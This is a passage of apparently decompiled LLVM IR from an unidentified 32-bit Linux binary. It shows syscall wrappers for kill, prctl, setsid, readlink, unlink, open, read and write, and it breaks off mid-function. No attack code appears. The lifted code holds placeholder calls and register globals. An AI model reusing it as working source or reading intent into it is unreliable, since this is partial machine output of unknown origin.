  br i1 %tmp7, label %dec_label_pc_80502c7, label %dec_label_pc_80502bb

dec_label_pc_80502bb:                             ; preds = %dec_label_pc_80502a7
  %v1_80502bb = call i32 @function_805078b(i32 %v0_80502a7)
  %v0_80502c0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502c0 = sub i32 0, %v0_80502c0
  %v2_80502c2 = inttoptr i32 %v1_80502bb to i32*
  store i32 %v1_80502c0, i32* %v2_80502c2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502cb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502c7

dec_label_pc_80502c7:                             ; preds = %dec_label_pc_80502a7, %dec_label_pc_80502bb
  %v2_80502cb = phi i32 [ %v0_80502a7, %dec_label_pc_80502a7 ], [ %v2_80502cb.pre, %dec_label_pc_80502bb ]
  %v0_80502c7 = phi i32 [ %v1_80502b0, %dec_label_pc_80502a7 ], [ -1, %dec_label_pc_80502bb ]
  %v2_80502c9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80502c9, i32* @edx, align 4
  store i32 %v2_80502cb, i32* @ebx, align 4
  ret i32 %v0_80502c7

; uselistorder directives
  uselistorder i32 %v1_80502b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502c7, { 1, 0 }
}

define i32 @function_80502cd() local_unnamed_addr {
dec_label_pc_80502cd:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502cd = load i32, i32* @ebx, align 4
  store i32 %v0_80502cd, i32* %stack_var_-4, align 4
  %v1_80502d6 = call i32 @getppid(i32 %v0_80502cd)
  store i32 %v1_80502d6, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80502d6, -4095
  br i1 %tmp7, label %dec_label_pc_80502ed, label %dec_label_pc_80502e1

dec_label_pc_80502e1:                             ; preds = %dec_label_pc_80502cd
  %v1_80502e1 = call i32 @function_805078b(i32 %v0_80502cd)
  %v0_80502e6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502e6 = sub i32 0, %v0_80502e6
  %v2_80502e8 = inttoptr i32 %v1_80502e1 to i32*
  store i32 %v1_80502e6, i32* %v2_80502e8, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502f1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502ed

dec_label_pc_80502ed:                             ; preds = %dec_label_pc_80502cd, %dec_label_pc_80502e1
  %v2_80502f1 = phi i32 [ %v0_80502cd, %dec_label_pc_80502cd ], [ %v2_80502f1.pre, %dec_label_pc_80502e1 ]
  %v0_80502ed = phi i32 [ %v1_80502d6, %dec_label_pc_80502cd ], [ -1, %dec_label_pc_80502e1 ]
  store i32 %v2_80502f1, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80502ed

; uselistorder directives
  uselistorder i32 %v1_80502d6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502ed, { 1, 0 }
}

define i32 @function_80502f3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80502f3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502f3 = load i32, i32* @edi, align 4
  store i32 %v0_80502f3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805030b = load i32, i32* @ebx, align 4
  %v2_8050313 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8050313, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8050313, -4095
  br i1 %tmp12, label %dec_label_pc_805032b, label %dec_label_pc_805031f

dec_label_pc_805031f:                             ; preds = %dec_label_pc_80502f3
  %v1_805031f = call i32 @function_805078b(i32 %v0_805030b)
  %v0_8050324 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050324 = sub i32 0, %v0_8050324
  %v2_8050326 = inttoptr i32 %v1_805031f to i32*
  store i32 %v1_8050324, i32* %v2_8050326, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050330.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805032b

dec_label_pc_805032b:                             ; preds = %dec_label_pc_80502f3, %dec_label_pc_805031f
  %v2_8050330 = phi i32 [ %v0_80502f3, %dec_label_pc_80502f3 ], [ %v2_8050330.pre, %dec_label_pc_805031f ]
  %v0_805032b = phi i32 [ %v2_8050313, %dec_label_pc_80502f3 ], [ -1, %dec_label_pc_805031f ]
  store i32 %v2_8050330, i32* %edi.global-to-local, align 4
  ret i32 %v0_805032b

; uselistorder directives
  uselistorder i32 %v2_8050313, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805032b, { 1, 0 }
}

define i32 @function_8050332(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050332:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050332 = load i32, i32* @ebx, align 4
  store i32 %v0_8050332, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050345 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8050345, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050345, -4095
  br i1 %tmp9, label %dec_label_pc_805035e, label %dec_label_pc_8050352

dec_label_pc_8050352:                             ; preds = %dec_label_pc_8050332
  %v1_8050352 = call i32 @function_805078b(i32 %v0_8050332)
  %v0_8050357 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050357 = sub i32 0, %v0_8050357
  %v2_8050359 = inttoptr i32 %v1_8050352 to i32*
  store i32 %v1_8050357, i32* %v2_8050359, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050362.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805035e

dec_label_pc_805035e:                             ; preds = %dec_label_pc_8050332, %dec_label_pc_8050352
  %v2_8050362 = phi i32 [ %v0_8050332, %dec_label_pc_8050332 ], [ %v2_8050362.pre, %dec_label_pc_8050352 ]
  %v0_805035e = phi i32 [ %v2_8050345, %dec_label_pc_8050332 ], [ -1, %dec_label_pc_8050352 ]
  %v2_8050360 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050360, i32* @edx, align 4
  store i32 %v2_8050362, i32* @ebx, align 4
  ret i32 %v0_805035e

; uselistorder directives
  uselistorder i32 %v2_8050345, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805035e, { 1, 0 }
}

define i32 @function_8050364(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050364:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050365 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_805036b = sdiv i32 %sext, 16777216
  %v4_805036f = ptrtoint i8* %arg1 to i32
  %v3_8050373 = and i32 %arg2, 64
  %v4_8050373 = icmp eq i32 %v3_8050373, 0
  br i1 %v4_8050373, label %dec_label_pc_8050384, label %dec_label_pc_8050378

dec_label_pc_8050378:                             ; preds = %dec_label_pc_8050364
  br label %dec_label_pc_8050384

dec_label_pc_8050384:                             ; preds = %dec_label_pc_8050364, %dec_label_pc_8050378
  store i32 %v4_805036f, i32* %ebx.global-to-local, align 4
  %v5_805038f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_805036b)
  store i32 %v5_805038f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805038f, -4095
  br i1 %tmp15, label %dec_label_pc_80503a7, label %dec_label_pc_805039b

dec_label_pc_805039b:                             ; preds = %dec_label_pc_8050384
  %v1_805039b = call i32 @function_805078b(i32 %v0_8050365)
  %v0_80503a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503a0 = sub i32 0, %v0_80503a0
  %v2_80503a2 = inttoptr i32 %v1_805039b to i32*
  store i32 %v1_80503a0, i32* %v2_80503a2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_80503a7:                             ; preds = %dec_label_pc_8050384, %dec_label_pc_805039b
  %v0_80503a7 = phi i32 [ %v5_805038f, %dec_label_pc_8050384 ], [ -1, %dec_label_pc_805039b ]
  store i32 %v0_8050365, i32* @ebx, align 4
  ret i32 %v0_80503a7

; uselistorder directives
  uselistorder i32 %v5_805038f, { 1, 0, 2 }
  uselistorder i32 %v0_8050365, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80503a7, { 1, 0 }
  uselistorder label %dec_label_pc_8050384, { 1, 0 }
}

define i32 @function_80503af(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80503af:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80503b0 = load i32, i32* @esi, align 4
  store i32 %v0_80503b0, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80503c8 = load i32, i32* @ebx, align 4
  %v5_80503d0 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_80503d0, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_80503d0, -4095
  br i1 %tmp12, label %dec_label_pc_80503e8, label %dec_label_pc_80503dc

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_80503af
  %v1_80503dc = call i32 @function_805078b(i32 %v0_80503c8)
  %v0_80503e1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503e1 = sub i32 0, %v0_80503e1
  %v2_80503e3 = inttoptr i32 %v1_80503dc to i32*
  store i32 %v1_80503e1, i32* %v2_80503e3, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80503eb.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80503e8

dec_label_pc_80503e8:                             ; preds = %dec_label_pc_80503af, %dec_label_pc_80503dc
  %v2_80503eb = phi i32 [ %v0_80503b0, %dec_label_pc_80503af ], [ %v2_80503eb.pre, %dec_label_pc_80503dc ]
  %v0_80503e8 = phi i32 [ %v5_80503d0, %dec_label_pc_80503af ], [ -1, %dec_label_pc_80503dc ]
  store i32 %v2_80503eb, i32* %esi.global-to-local, align 4
  ret i32 %v0_80503e8

; uselistorder directives
  uselistorder i32 %v5_80503d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503e8, { 1, 0 }
}

define i32 @function_80503ee(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80503ee:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80503ee = load i32, i32* @edi, align 4
  store i32 %v0_80503ee, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80503fe = load i32, i32* @ebx, align 4
  %v4_8050406 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8050406, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8050406, -4095
  br i1 %tmp12, label %dec_label_pc_805041e, label %dec_label_pc_8050412

dec_label_pc_8050412:                             ; preds = %dec_label_pc_80503ee
  %v1_8050412 = call i32 @function_805078b(i32 %v0_80503fe)
  %v0_8050417 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050417 = sub i32 0, %v0_8050417
  %v2_8050419 = inttoptr i32 %v1_8050412 to i32*
  store i32 %v1_8050417, i32* %v2_8050419, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050422.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805041e

dec_label_pc_805041e:                             ; preds = %dec_label_pc_80503ee, %dec_label_pc_8050412
  %v2_8050422 = phi i32 [ %v0_80503ee, %dec_label_pc_80503ee ], [ %v2_8050422.pre, %dec_label_pc_8050412 ]
  %v0_805041e = phi i32 [ %v4_8050406, %dec_label_pc_80503ee ], [ -1, %dec_label_pc_8050412 ]
  store i32 %v2_8050422, i32* %edi.global-to-local, align 4
  ret i32 %v0_805041e

; uselistorder directives
  uselistorder i32 %v4_8050406, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805041e, { 1, 0 }
}

define i32 @function_8050424(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050424:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_8050424 = load i32, i32* @edi, align 4
  store i32 %v0_8050424, i32* %stack_var_-4, align 4
  %v4_8050428 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050428, i32* %edi.global-to-local, align 4
  %v0_8050434 = load i32, i32* @ebx, align 4
  %v7_805043c = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v7_805043c, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805043c, -4095
  br i1 %tmp13, label %dec_label_pc_8050454, label %dec_label_pc_8050448

dec_label_pc_8050448:                             ; preds = %dec_label_pc_8050424
  %v1_8050448 = call i32 @function_805078b(i32 %v0_8050434)
  %v0_805044d = load i32, i32* %edi.global-to-local, align 4
  %v1_805044d = sub i32 0, %v0_805044d
  %v2_805044f = inttoptr i32 %v1_8050448 to i32*
  store i32 %v1_805044d, i32* %v2_805044f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050458.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050454

dec_label_pc_8050454:                             ; preds = %dec_label_pc_8050424, %dec_label_pc_8050448
  %v2_8050458 = phi i32 [ %v0_8050424, %dec_label_pc_8050424 ], [ %v2_8050458.pre, %dec_label_pc_8050448 ]
  %v0_8050454 = phi i32 [ %v7_805043c, %dec_label_pc_8050424 ], [ -1, %dec_label_pc_8050448 ]
  store i32 %v2_8050458, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050454

; uselistorder directives
  uselistorder i32 %v7_805043c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050454, { 1, 0 }
}

define i32 @function_805045a() local_unnamed_addr {
dec_label_pc_805045a:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805045b = load i32, i32* @esi, align 4
  store i32 %v0_805045b, i32* %stack_var_-8, align 4
  %v0_8050473 = load i32, i32* @ebx, align 4
  %v1_805047b = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050473, i32* @ebx, align 4
  store i32 %v1_805047b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_805047b, -4095
  br i1 %tmp12, label %dec_label_pc_8050493, label %dec_label_pc_8050487

dec_label_pc_8050487:                             ; preds = %dec_label_pc_805045a
  %v1_8050487 = call i32 @function_805078b(i32 %v0_8050473)
  %v0_805048c = load i32, i32* %esi.global-to-local, align 4
  %v1_805048c = sub i32 0, %v0_805048c
  %v2_805048e = inttoptr i32 %v1_8050487 to i32*
  store i32 %v1_805048c, i32* %v2_805048e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8050496.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8050493

dec_label_pc_8050493:                             ; preds = %dec_label_pc_805045a, %dec_label_pc_8050487
  %v2_8050496 = phi i32 [ %v0_805045b, %dec_label_pc_805045a ], [ %v2_8050496.pre, %dec_label_pc_8050487 ]
  %v0_8050493 = phi i32 [ %v1_805047b, %dec_label_pc_805045a ], [ -1, %dec_label_pc_8050487 ]
  store i32 %v2_8050496, i32* @esi, align 4
  ret i32 %v0_8050493

; uselistorder directives
  uselistorder i32 %v1_805047b, { 1, 0, 2 }
  uselistorder i32 %v0_8050473, { 1, 0 }
  uselistorder label %dec_label_pc_8050493, { 1, 0 }
}

define i32 @function_8050499() local_unnamed_addr {
dec_label_pc_8050499:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050499 = load i32, i32* @ebx, align 4
  store i32 %v0_8050499, i32* %stack_var_-4, align 4
  %v1_80504a2 = call i32 @setsid(i32 %v0_8050499)
  store i32 %v1_80504a2, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80504a2, -4095
  br i1 %tmp7, label %dec_label_pc_80504b9, label %dec_label_pc_80504ad

dec_label_pc_80504ad:                             ; preds = %dec_label_pc_8050499
  %v1_80504ad = call i32 @function_805078b(i32 %v0_8050499)
  %v0_80504b2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80504b2 = sub i32 0, %v0_80504b2
  %v2_80504b4 = inttoptr i32 %v1_80504ad to i32*
  store i32 %v1_80504b2, i32* %v2_80504b4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80504bd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80504b9

dec_label_pc_80504b9:                             ; preds = %dec_label_pc_8050499, %dec_label_pc_80504ad
  %v2_80504bd = phi i32 [ %v0_8050499, %dec_label_pc_8050499 ], [ %v2_80504bd.pre, %dec_label_pc_80504ad ]
  %v0_80504b9 = phi i32 [ %v1_80504a2, %dec_label_pc_8050499 ], [ -1, %dec_label_pc_80504ad ]
  store i32 %v2_80504bd, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80504b9

; uselistorder directives
  uselistorder i32 %v1_80504a2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80504b9, { 1, 0 }
}

define i32 @function_80504bf(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80504bf:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80504c0 = load i32, i32* @esi, align 4
  %v4_80504c4 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80504c4, i32* @ecx, align 4
  %v2_80504d0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_80504d0
  br i1 %or.cond, label %dec_label_pc_80504e9, label %dec_label_pc_80504d9

dec_label_pc_80504d9:                             ; preds = %dec_label_pc_80504bf
  %v1_80504d9 = call i32 @function_805078b(i32 %v0_80504c0)
  %v1_80504de = inttoptr i32 %v1_80504d9 to i32*
  store i32 22, i32* %v1_80504de, align 4
  br label %dec_label_pc_8050510

dec_label_pc_80504e9:                             ; preds = %dec_label_pc_80504bf
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80504ee = load i32, i32* @ebx, align 4
  %v7_80504f6 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80504ee, i32* @ebx, align 4
  store i32 %v7_80504f6, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_80504f6, -4095
  br i1 %tmp12, label %dec_label_pc_8050510, label %dec_label_pc_8050502

dec_label_pc_8050502:                             ; preds = %dec_label_pc_80504e9
  %v1_8050502 = call i32 @function_805078b(i32 %v0_80504ee)
  %v0_8050507 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050507 = sub i32 0, %v0_8050507
  %v2_8050509 = inttoptr i32 %v1_8050502 to i32*
  store i32 %v1_8050507, i32* %v2_8050509, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050510

dec_label_pc_8050510:                             ; preds = %dec_label_pc_8050502, %dec_label_pc_80504e9, %dec_label_pc_80504d9
  %storemerge = phi i32 [ -1, %dec_label_pc_80504d9 ], [ %v7_80504f6, %dec_label_pc_80504e9 ], [ -1, %dec_label_pc_8050502 ]
  %v2_8050510 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050510, i32* @edx, align 4
  store i32 %v0_80504c0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_80504f6, { 1, 0, 2 }
  uselistorder i32 %v0_80504ee, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8050514() local_unnamed_addr {
dec_label_pc_8050514:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050514 = load i32, i32* @edi, align 4
  store i32 %v0_8050514, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_805051c = load i32, i32* @ebx, align 4
  %v1_8050524 = inttoptr i32 %tmp to i32*
  %v2_8050524 = call i32 @time(i32* %v1_8050524)
  store i32 %v0_805051c, i32* @ebx, align 4
  store i32 %v2_8050524, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050524, -4095
  br i1 %tmp9, label %dec_label_pc_805053c, label %dec_label_pc_8050530

dec_label_pc_8050530:                             ; preds = %dec_label_pc_8050514
  %v1_8050530 = call i32 @function_805078b(i32 %v0_805051c)
  %v0_8050535 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050535 = sub i32 0, %v0_8050535
  %v2_8050537 = inttoptr i32 %v1_8050530 to i32*
  store i32 %v1_8050535, i32* %v2_8050537, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050540.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805053c

dec_label_pc_805053c:                             ; preds = %dec_label_pc_8050514, %dec_label_pc_8050530
  %v2_8050540 = phi i32 [ %v0_8050514, %dec_label_pc_8050514 ], [ %v2_8050540.pre, %dec_label_pc_8050530 ]
  %v0_805053c = phi i32 [ %v2_8050524, %dec_label_pc_8050514 ], [ -1, %dec_label_pc_8050530 ]
  store i32 %v2_8050540, i32* %edi.global-to-local, align 4
  ret i32 %v0_805053c

; uselistorder directives
  uselistorder i32 %v2_8050524, { 1, 0, 2 }
  uselistorder i32 %v0_805051c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805053c, { 1, 0 }
}

define i32 @function_8050542(i8* %arg1) local_unnamed_addr {
dec_label_pc_8050542:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050542 = load i32, i32* @edi, align 4
  store i32 %v0_8050542, i32* %stack_var_-4, align 4
  %v4_8050546 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050546, i32* %edi.global-to-local, align 4
  %v0_805054a = load i32, i32* @ebx, align 4
  %v3_8050552 = call i32 @unlink(i8* %arg1)
  store i32 %v3_8050552, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8050552, -4095
  br i1 %tmp9, label %dec_label_pc_805056a, label %dec_label_pc_805055e

dec_label_pc_805055e:                             ; preds = %dec_label_pc_8050542
  %v1_805055e = call i32 @function_805078b(i32 %v0_805054a)
  %v0_8050563 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050563 = sub i32 0, %v0_8050563
  %v2_8050565 = inttoptr i32 %v1_805055e to i32*
  store i32 %v1_8050563, i32* %v2_8050565, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805056e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805056a

dec_label_pc_805056a:                             ; preds = %dec_label_pc_8050542, %dec_label_pc_805055e
  %v2_805056e = phi i32 [ %v0_8050542, %dec_label_pc_8050542 ], [ %v2_805056e.pre, %dec_label_pc_805055e ]
  %v0_805056a = phi i32 [ %v3_8050552, %dec_label_pc_8050542 ], [ -1, %dec_label_pc_805055e ]
  store i32 %v2_805056e, i32* %edi.global-to-local, align 4
  ret i32 %v0_805056a

; uselistorder directives
  uselistorder i32 %v3_8050552, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805056a, { 1, 0 }
}

define i32 @function_8050570(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050570:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050570 = load i32, i32* @edi, align 4
  store i32 %v0_8050570, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050580 = load i32, i32* @ebx, align 4
  %v4_8050588 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8050588, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8050588, -4095
  br i1 %tmp12, label %dec_label_pc_80505a0, label %dec_label_pc_8050594

dec_label_pc_8050594:                             ; preds = %dec_label_pc_8050570
  %v1_8050594 = call i32 @function_805078b(i32 %v0_8050580)
  %v0_8050599 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050599 = sub i32 0, %v0_8050599
  %v2_805059b = inttoptr i32 %v1_8050594 to i32*
  store i32 %v1_8050599, i32* %v2_805059b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80505a4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80505a0

dec_label_pc_80505a0:                             ; preds = %dec_label_pc_8050570, %dec_label_pc_8050594
  %v2_80505a4 = phi i32 [ %v0_8050570, %dec_label_pc_8050570 ], [ %v2_80505a4.pre, %dec_label_pc_8050594 ]
  %v0_80505a0 = phi i32 [ %v4_8050588, %dec_label_pc_8050570 ], [ -1, %dec_label_pc_8050594 ]
  store i32 %v2_80505a4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80505a0

; uselistorder directives
  uselistorder i32 %v4_8050588, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80505a0, { 1, 0 }
}

define i32 @function_80505a6(i32* %arg1) local_unnamed_addr {
dec_label_pc_80505a6:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_80505a8 = load i32, i32* @ebx, align 4
  %v12_80505a9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_80505b0 = load i32, i32* %arg1, align 4
  %v12_80505b0 = icmp eq i32 %v2_80505b0, -1
  %v1_80505b3 = icmp eq i1 %v12_80505b0, false
  br i1 %v1_80505b3, label %dec_label_pc_80505c5, label %dec_label_pc_80505b5

dec_label_pc_80505b5:                             ; preds = %dec_label_pc_80505a6
  %v1_80505b5 = call i32 @function_805078b(i32 %v0_80505a8)
  %v1_80505ba = inttoptr i32 %v1_80505b5 to i32*
  store i32 9, i32* %v1_80505ba, align 4
  br label %dec_label_pc_805060f

dec_label_pc_80505c5:                             ; preds = %dec_label_pc_80505a6
  %v1_80505c5 = add i32 %tmp3, 24
  store i32 %v12_80505a9, i32* @esi, align 4
  %v2_80505d4 = call i32 @function_80520ea(i32 %v12_80505a9, i32 134553831)
  %v1_80505dc = call i32 @function_80520e7(i32 %v1_80505c5)
  store i32 %v1_80505dc, i32* @eax, align 4
  %v0_80505e1 = load i32, i32* @edi, align 4
  %v1_80505e1 = inttoptr i32 %v0_80505e1 to i32*
  %v2_80505e1 = load i32, i32* %v1_80505e1, align 4
  store i32 %v2_80505e1, i32* @ebx, align 4
  store i32 -1, i32* %v1_80505e1, align 4
  %v2_80505ee = call i32 @function_80520ea(i32 %v12_80505a9, i32 1)
  %v0_80505f4 = load i32, i32* @edi, align 4
  %v1_80505f4 = add i32 %v0_80505f4, 12
  %v2_80505f4 = inttoptr i32 %v1_80505f4 to i32*
  %v3_80505f4 = load i32, i32* %v2_80505f4, align 4
  %v1_80505f7 = call i32 @function_8051983(i32 %v3_80505f4)
  %v0_80505fc = load i32, i32* @edi, align 4
  %v1_80505ff = call i32 @function_8051983(i32 %v0_80505fc)
  %v0_8050604 = load i32, i32* @ebx, align 4
  %v1_8050607 = call i32 @function_8050253(i32 %v0_8050604)
  br label %dec_label_pc_805060f

dec_label_pc_805060f:                             ; preds = %dec_label_pc_80505b5, %dec_label_pc_80505c5
  %v0_8050615 = phi i32 [ -1, %dec_label_pc_80505b5 ], [ %v1_8050607, %dec_label_pc_80505c5 ]
  ret i32 %v0_8050615

; uselistorder directives
  uselistorder label %dec_label_pc_805060f, { 1, 0 }
}

define i32 @function_8050616(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050616:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8050627 = inttoptr i32 %arg1 to i8*
  %v3_8050627 = call i32 @function_8050364(i8* %v2_8050627, i32 67584)
  store i32 %v3_8050627, i32* %eax.global-to-local, align 4
  store i32 %v3_8050627, i32* @edi, align 4
  %v2_8050631 = icmp slt i32 %v3_8050627, 0
  br i1 %v2_8050631, label %dec_label_pc_80506fe, label %dec_label_pc_8050639

dec_label_pc_8050639:                             ; preds = %dec_label_pc_8050616
  %v0_8050639 = load i32, i32* @ebx, align 4
  %v2_805063b = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_805063b, i32* %eax.global-to-local, align 4
  store i32 %v3_8050627, i32* %stack_var_-124, align 4
  %v4_8050641 = call i32 @function_80524e2(i32 %v3_8050627, i32 %v2_805063b, i32 %v0_8050639, i32 %v0_8050639)
  store i32 %v4_8050641, i32* %eax.global-to-local, align 4
  %v2_8050649 = icmp slt i32 %v4_8050641, 0
  br i1 %v2_8050649, label %dec_label_pc_805065f, label %dec_label_pc_805064d

dec_label_pc_805064d:                             ; preds = %dec_label_pc_8050639
